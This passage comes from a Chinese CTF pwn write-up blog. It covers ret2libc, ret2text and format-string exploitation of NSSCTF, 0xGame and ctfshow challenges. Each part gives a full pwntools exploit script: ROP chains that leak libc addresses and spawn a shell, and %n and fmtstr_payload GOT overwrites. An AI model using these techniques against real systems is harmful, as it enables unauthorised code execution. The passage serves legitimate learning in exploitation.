+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/eqpk6ghhpxdn8upe">栈溢出练习(ret2libc)</a> · 创建 2026-09-25 · 最后更新 2026-09-25</p>
+</blockquote>
+<p>依旧先查看文件信息</p>
+<p><img src="/img/pwn-wp/img-12.png"></p>
+<p>可以看到64位的程序，然后开启了NX保护，是一个动态可执行文件，然后在IDA中做静态分析</p>
+<p><img src="/img/pwn-wp/img-13.png"></p>
+<p>这里可以看到main函数中有保护机制，判断了buf的长度，长度大于0x50就会被拦截下来，我们要想办法绕过，而strlen函数在遇到空字符会停止读取，因此可以用\x00来绕过，后面就是ret2libc的常规套路了，通过泄露got表中的地址计算偏移量，从而获取system函数和后门”&#x2F;bin&#x2F;sh”的地址最后getshell，构造的exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn4&#x27;)</span><br><span class="line">p = remote(&#x27;node4.anna.nssctf.cn&#x27;,24397)</span><br><span class="line">elf = ELF(&#x27;./pwn4&#x27;)</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x08 + 0x60</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">ret_addr = 0x400556</span><br><span class="line">pop_rdi = 0x4007d3</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;\x00&#x27; + b&#x27;A&#x27; * (offset - 1)</span><br><span class="line">payload1 += p64(pop_rdi)</span><br><span class="line">payload1 += p64(puts_got)</span><br><span class="line">payload1 += p64(puts_plt)</span><br><span class="line">payload1 += p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Leave your message:\n&#x27;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Ok,Message Received\n&#x27;)</span><br><span class="line">puts_addr = u64(p.recvline()[:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = base_addr + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = base_addr + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">log.success(f&#x27;puts_addr:&#123;hex(puts_addr)&#125;&#x27;)</span><br><span class="line">log.success(f&#x27;system_addr:&#123;hex(system_addr)&#125;&#x27;)</span><br><span class="line">log.success(f&#x27;binsh_addr:&#123;hex(binsh_addr)&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;\x00&#x27; + b&#x27;A&#x27; * (offset - 1)</span><br><span class="line">payload2 += p64(ret_addr)</span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(binsh_addr)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后其实ret2libc感觉难度其实调试占了很大一半，思路其实算比较简单，这里记录一下调试中遇到的几个问题</p>
+<p><img src="/img/pwn-wp/img-14.png"></p>
+<p>这里第一个问题，没有吃掉”Ok,Message Received”这个语句就接收地址，最后接收到的是这个语句的内容</p>
+<p><img src="/img/pwn-wp/img-15.png"></p>
+<p>这里第二个问题，也是出在地址接收上面，接收的地址多收了0a也就是\n，要把它截断才行因此这里用的recvline</p>
+<p>并且取地址是[:-1]这样倒着取的，最后接收完数据其实可以打印出来看一下对不对，通常got表中的地址是0x7f之类的开头</p>
+<p>总之ret2libc这种类型调试上是一大难点，而其中大部分问题可能集中在got表泄露的地址接收处，调试中要重点看debug中输出的Received下的数据，通过分析接收到的数据和预想的差异来调整</p>
+<hr>
+<h2 id="6-栈溢出练习-ret2libc-（ezrop64）"><a href="#6-栈溢出练习-ret2libc-（ezrop64）" class="headerlink" title="6. 栈溢出练习(ret2libc)（ezrop64）"></a>6. 栈溢出练习(ret2libc)（ezrop64）</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/zknr20rpbyttyzbc">栈溢出练习(ret2libc)</a> · 创建 2026-09-26 · 最后更新 2026-09-26</p>
+</blockquote>
+<p>查看文件信息</p>
+<p><img src="/img/pwn-wp/img-16.png"></p>
+<p>栈上保护NX是开了的，IBT保护也开了，用于防止ROP构造中通过构造jmp等指令来实现间接跳转的，还开启了SHSTK，这个保护是用来防止栈溢出覆盖保存的返回地址，不过对这个题影响不大，下面看IDA中的反编译代码</p>
+<p><img src="/img/pwn-wp/img-17.png"></p>
+<p>程序很简单，这里printf直接打印了puts的地址，不需要我们去泄露直接接收后计算偏移量得到system和&#x2F;bin&#x2F;sh的地址就行，下面构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./ezrop64&#x27;)</span><br><span class="line">p = remote(&#x27;node4.anna.nssctf.cn&#x27;,24589)</span><br><span class="line">elf = ELF(&#x27;./ezrop64&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x08 + 0x100</span><br><span class="line">ret_addr = 0x000000000040101a</span><br><span class="line">pop_rdi = 0x00000000004012a3</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Gift :&#x27;)</span><br><span class="line">puts_addr = int(p.recvline()[:-1].ljust(8,b&#x27;\x00&#x27;),16)</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">system_addr = base_addr + libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh_addr = base_addr + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line"></span><br><span class="line">print(system_addr)</span><br><span class="line">print(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;A&#x27; * offset</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Start your rop.\n&#x27;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里其实过程分析不是难点，主要难点也是在调试上，而且也是puts地址的接收上，这里printf函数打印出来的地址已经是0x7f开头的十六进制数字，不能再用u64来接收，而上一题可以用u64接收，因为上一题puts函数打印出来的地址是\x开头的字节码</p>
+<hr>
+<h2 id="7-栈溢出练习-ret2libc2019CISCN"><a href="#7-栈溢出练习-ret2libc2019CISCN" class="headerlink" title="7. 栈溢出练习(ret2libc2019CISCN)"></a>7. 栈溢出练习(ret2libc2019CISCN)</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/ckuspfc6ogswoqm8">栈溢出练习(ret2libc2019CISCN)</a> · 创建 2026-09-26 · 最后更新 2026-09-26</p>
+</blockquote>
+<p>先查看文件信息</p>
+<p><img src="/img/pwn-wp/img-18.png"></p>
+<p>只开启了NX栈保护，下面看IDA的反编译代码</p>
+<p><img src="/img/pwn-wp/img-19.png"></p>
+<p>先看主函数逻辑，这里面嵌套了两层循环，首先会从键盘录入一个整数，然后如果不等于2就会跳出最里面的循环，如果等于2就会打印那句话并且执行begin函数，然后如果等于3就会打印”Bye”以后直接退出，如果不等于1就会跳出第二层循环，如果等于1就会执行encrypt函数和begin函数，下面看看这两个函数的逻辑</p>
+<p><img src="/img/pwn-wp/img-20.png"></p>
+<p>begin函数就是打印了一些字符，没有什么太大作用</p>
+<p><img src="/img/pwn-wp/img-21.png"></p>
+<p>然后是encrypt函数，这个函数会发现有栈溢出漏洞gets函数处，然后后面一大坨其实是对输入内容的检测和加密机制，要想输入的数据不受影响就要绕过去，这里看到如果v0大于等于strlen读取的长度就会break跳出，因此可以用’\x00’来截断strlen的读取，就可以利用ret2libc的常规套路来解决了，下面构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&#x27;node5.anna.nssctf.cn&#x27;,23071)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 0x08 + 0x50</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">ret_addr = 0x00000000004006b9</span><br><span class="line">pop_rdi = 0x0000000000400c83</span><br><span class="line">encrypt_addr = 0x00000000004009A0</span><br><span class="line"></span><br><span class="line">p.sendline(str(0x01))       #这里是为了跳转到encrypt函数内部</span><br><span class="line"></span><br><span class="line">payload1 = b&#x27;\x00&#x27; + b&#x27;A&#x27; * (offset - 1)</span><br><span class="line">payload1 += p64(pop_rdi)</span><br><span class="line">payload1 += p64(puts_got)</span><br><span class="line">payload1 += p64(puts_plt)</span><br><span class="line">payload1 += p64(encrypt_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Input your Plaintext to be encrypted\n&#x27;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">p.recvuntil(&#x27;\n&#x27;)         #这里吃掉两次\n，因为接收的地址在puts(s)后面，而puts会自动加上\n，因此要等待函数结尾两个puts函数输出内容被吃掉才接收地址</span><br><span class="line">puts_addr = u64(p.recvline()[:-1].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log.success(f&#x27;puts_addr:&#123;hex(puts_addr)&#125;&#x27;)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">base_addr = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = base_addr + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = base_addr + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = b&#x27;\x00&#x27; + b&#x27;A&#x27; * (offset - 1)</span><br><span class="line">payload2 += p64(ret_addr)</span><br><span class="line">payload2 += p64(pop_rdi)</span><br><span class="line">payload2 += p64(binsh_addr)</span><br><span class="line">payload2 += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Input your Plaintext to be encrypted\n&#x27;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="8-0xGame部分Pwn题题解"><a href="#8-0xGame部分Pwn题题解" class="headerlink" title="8. 0xGame部分Pwn题题解"></a>8. 0xGame部分Pwn题题解</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/apdubknimdgv66aw">0xGame部分Pwn题题解</a> · 创建 2026-09-28 · 最后更新 2026-10-01</p>
+</blockquote>
+<h3 id="亦步亦趋-ret2text"><a href="#亦步亦趋-ret2text" class="headerlink" title="亦步亦趋(ret2text)"></a>亦步亦趋(ret2text)</h3><p>先查看文件信息</p>
+<p><img src="/img/pwn-wp/img-22.png"></p>
+<p>这里，有个很重要的点对这题影响很大，开启了PIE保护，意味着IDA中的地址都是偏移量，而不是PLT表地址，下面看一下IDA中的反编译情况</p>
+<p><img src="/img/pwn-wp/img-23.png"></p>
+<p>这里面主函数没什么特别的打印了一些字符就跳转到level1函数里面去了，下面看一下level1函数的内容</p>
+<p><img src="/img/pwn-wp/img-24.png"></p>
+<p>这里可以看到有个条件判断，如果v2 !&#x3D; -559038737为真就会打印里面的内容，并且退出程序，如果v2 &#x3D; -559038737就会继续执行后面level2函数，这里肯定要执行level2，否则拿不到flag，而-559038737的十六进制表示，其实就是前面字符文段提示中的0xdeadbeef，但是read函数把内容读给了buf变量，因此我们的思路就是利用溢出的思路把0xdeadbeef写到v2处然后进入level2函数</p>
+<p><img src="/img/pwn-wp/img-25.png"></p>
+<p>这里很容易看到溢出函数gets同时这里会打印后门函数win的实际地址，那么下面就可以构造wp了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote()</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">offset1 = 0x20 - 0x04</span><br><span class="line">payload1 = b&#x27;A&#x27; * offset1 + p32(0xdeadbeef)           #这里发送的p32，因为要放到v2中，v2是int型，int有4个字节32位</span><br><span class="line">p.send(payload1)           #这里因为接收函数是read，因此不用sendline会多发一个\n破坏payload结构</span><br><span class="line"></span><br><span class="line">offset2 = 0x08 + 0x20</span><br><span class="line">p.recvuntil(b&quot;It&#x27;s addr about: &quot;)</span><br><span class="line">win_addr = int(p.recvline().ljust(8,b&#x27;\x00&#x27;),16)</span><br><span class="line">log.success(f&#x27;win_addr:&#123;hex(win_addr)&#125;&#x27;)</span><br><span class="line">win = 0x1209</span><br><span class="line">ret = 0x101a           #这里是ida和ROPgadget中读出来的win和ret的偏移量</span><br><span class="line">base_addr = win_addr - win</span><br><span class="line">ret_addr = base_addr + ret            #这里算出ret实际地址用于栈对齐</span><br><span class="line">payload2 = b&#x27;A&#x27; * offset2 + p64(ret_addr) + p64(win_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b&#x27;Now input your final Payload:&#x27;)</span><br><span class="line">p.recvuntil(b&#x27;&gt; &#x27;)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>最后总结两个犯的错，第一个read函数不需要用sendline发送数据，还可能因为多发送的\n而打破payload结构，第二个具体用p64打包数据还是用p32打包数据除了看程序是64位还是32位也和你发送的对象有关，比如这里要把数据送给一个int类型的变量，而int是4字节32位的就采用的p32</p>
+<h3 id="三扇门-ret2text"><a href="#三扇门-ret2text" class="headerlink" title="三扇门(ret2text)"></a>三扇门(ret2text)</h3><p>信息查看就略去，直接从ida反编译记录</p>
+<p><img src="/img/pwn-wp/img-26.png"></p>
+<p>这里可以看到vuln函数存在溢出</p>
+<p><img src="/img/pwn-wp/img-27.png"></p>
+<p>容易发现win函数中存在后门system(“&#x2F;bin&#x2F;sh”)，前面的提示给出了一种方法ret2csu，但其实这题不需要这么麻烦，我们直接看win函数的汇编</p>
+<p><img src="/img/pwn-wp/img-28.png"></p>
+<p>目的就是要进入左边的板块，这里只需要把左边板块的地址放入payload，然后溢出到返回地址就行，exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote()</span><br><span class="line"></span><br><span class="line">offset = 0x08 + 0x10</span><br><span class="line">payload = b&#x27;A&#x27; * offset + p64(0x401287)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以进入shell了，只不过这个程序进去的目录没有flag，所以要cd ..&#x2F;..&#x2F;进入根目录拿flag</p>
+<hr>
+<h2 id="9-字符串格式化漏洞学习-n写入"><a href="#9-字符串格式化漏洞学习-n写入" class="headerlink" title="9. 字符串格式化漏洞学习(%n写入)"></a>9. 字符串格式化漏洞学习(%n写入)</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/zdq15gd7rz5vy7kd">字符串格式化漏洞学习(%n写入)</a> · 创建 2026-10-03 · 最后更新 2026-10-05</p>
+</blockquote>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>字符串格式化漏洞其实也就是C语言函数的一种不安全设计，导致其可以越界访问栈上的数据，比如printf家族</p>
+<p>包括printf，fprintf，sprintf，snprintf，dprintf等等，以下面程序为例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">  int a = 1;</span><br><span class="line">  int b = 2;</span><br><span class="line">  printf(&quot;%d%d%d&quot;,a,b);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里只传入了a和b两个参数，但是却要求格式化输出三个值，第三个printf函数就会在栈上下一个地址去查找，并且把对应的值打印出来，这里再补充几个常用的格式化字符串技巧</p>
+<p>%p以指针的形式打印对应处地址</p>
+<p>%s找到对应地址处的值，把值打印出来</p>
+<p>%x以无符号十六进制形式打印对应值</p>
+<p>%n把前面打印的字符个数写进参数指向的内存地址</p>
+<p>前三个常用于内存信息泄露，第四个常用于内存地址写入，同时在字符串格式化中间加上n$就代表第几个参数，此外%n写入数据是4个字节，也就是一个int，但如果有长度限制可以用%hn和%hhn，代表2个字节和1个字节</p>
+<h3 id="例题1-fmtstr1"><a href="#例题1-fmtstr1" class="headerlink" title="例题1 fmtstr1"></a>例题1 fmtstr1</h3><p><img src="/img/pwn-wp/img-29.png"></p>
+<p>32位程序，然后开启了金丝雀保护和栈保护，下面看IDA的反编译</p>
+<p><img src="/img/pwn-wp/img-30.png"></p>
+<p>很容易看到后门函数就在主函数程序中，只要让x的值等于4就行了，这里栈溢出很明显不可用了，有金丝雀，同时read函数读入数据长度限制在80，只能考虑printf函数的字符串格式化漏洞</p>
+<p><img src="/img/pwn-wp/img-31.png"></p>
+<p>这里看到x处的值是3，那么要考虑用%n进行写入了，这里再写一下，字符串格式化漏洞可以泄露或者写入栈上内存空间任意地址的原理是格式化字符串作为参数传入本身也存储在栈上，因此这里要确定%n传参在栈上的储存位置，先构造一次下面的exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./fmtstr1&#x27;)</span><br><span class="line">payload = b&#x27;A&#x27; * 4 + b&#x27;%p.&#x27; * 14 + b&#x27;%p&#x27;</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下</p>
+<p><img src="/img/pwn-wp/img-32.png"></p>
+<p>可以数一下发现第11个十六进制数出现了0x41414141，那么可以确定传入的字符串格式化在栈上的位置是第11个参数，下面构造攻击exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">x_addr = 0x0804A02C</span><br><span class="line">payload = p32(x_addr) + b&#x27;%11$n&#x27;</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里简单记录一下payload的逻辑，这里x的地址是32位4字节的，printf格式化输出之后x地址被分成4字节打印出来了\x2c \xa0 \x04 \x08，然后x地址传入的位置是栈上第11个参数的位置，%11$n这里就把4指向了x地址所指向的内存空间，这里补充一个知识点因为x86架构是小端序存储，所以数据读取是低字节开始读取，因此地址是倒序输出的</p>
+<h3 id="练习-ctfshow"><a href="#练习-ctfshow" class="headerlink" title="练习 ctfshow"></a>练习 ctfshow</h3><p>同样是个32位程序，下面直接看ida反编译代码</p>
+<p><img src="/img/pwn-wp/img-33.png"></p>
+<p>后门函数在主函数中，这里要使得daniu &#x3D; 6才行</p>
+<p><img src="/img/pwn-wp/img-34.png"></p>
+<p>ctfshow函数中开启了金丝雀保护，但是printf(s)处存在字符串格式化漏洞，第一步还是构造exp确定传入参数的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">payload = b&#x27;AAAA&#x27; + b&#x27;%p.&#x27; * 10 + b&#x27;%p&#x27;</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/pwn-wp/img-35.png"></p>
+<p>从回显结果可以看到是第7个参数0x41414141，下面构造攻击exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">daniu_addr = 0x0804B038</span><br><span class="line">payload = p32(daniu_addr) + b&#x27;aa&#x27; + b&#x27;%7$n&#x27;</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这个思路和上一题基本一样，只不过由于这个数字是6因此要多填充两个a，此外32位程序栈上是4字节一个槽位，所以后面输入的两个a并不会进入daniu存放地址处从而破坏地址</p>
+<h3 id="练习-printf的危险操作"><a href="#练习-printf的危险操作" class="headerlink" title="练习 printf的危险操作"></a>练习 printf的危险操作</h3><p>同样是ctfshow的题目，这里直接从关键点开始看</p>
+<p><img src="/img/pwn-wp/img-36.png"></p>
+<p>这里可以看到s中的内容是写入的flag，同时要求用户输入的数据存放在format中，但是这里printf(format,s)这种写法产生了字符串格式化漏洞，因为用户输入的数据被当作第一个实参传给printf函数后会被当做字符串格式化解析，而不是普通的输出，如果用户输入的是%s，那么就相当于printf(“%s”,s)这个语句把flag打印出来了，同理具体情况中遇到printf(format,s)也可以利用%n写入</p>
+<hr>
+<h2 id="10-字符串格式化漏洞-getshell"><a href="#10-字符串格式化漏洞-getshell" class="headerlink" title="10. 字符串格式化漏洞(getshell)"></a>10. 字符串格式化漏洞(getshell)</h2><blockquote>
+<p>原文：<a target="_blank" rel="noopener" href="https://www.yuque.com/buchiyali-eknnb/ppfgei/bwul3x8rn6xt37c7">字符串格式化漏洞(getshell)</a> · 创建 2026-10-05 · 最后更新 2026-10-05</p>
+</blockquote>
+<h3 id="ctfshow94题"><a href="#ctfshow94题" class="headerlink" title="ctfshow94题"></a>ctfshow94题</h3><p><img src="/img/pwn-wp/img-37.png"></p>
+<p><img src="/img/pwn-wp/img-38.png"></p>
+<p>可以看到程序中有system函数，同时ctfshow函数中的printf函数处有字符串格式化漏洞，这里的想法就是通过改写printf函数got表指向的地址来拿到shell，第一步依旧先看栈上可控的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">payload = b&#x27;AAAA&#x27; + b&#x27;%p.&#x27; * 10 + b&#x27;%p&#x27;</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/pwn-wp/img-39.png"></p>
+<p>可以看到是第六个参数，下面构造攻击payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">payload = fmtstr_payload(6,&#123;printf_got:system_plt&#125;)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="ctfshow95题"><a href="#ctfshow95题" class="headerlink" title="ctfshow95题"></a>ctfshow95题</h3><p><img src="/img/pwn-wp/img-40.png"></p>
+<p>这个是主程序，这题和上一题的差别就是没有system可以直接利用，但是这题可以参照ret2libc的思路通过泄露printf函数在libc表中的地址来得到system函数的地址</p>
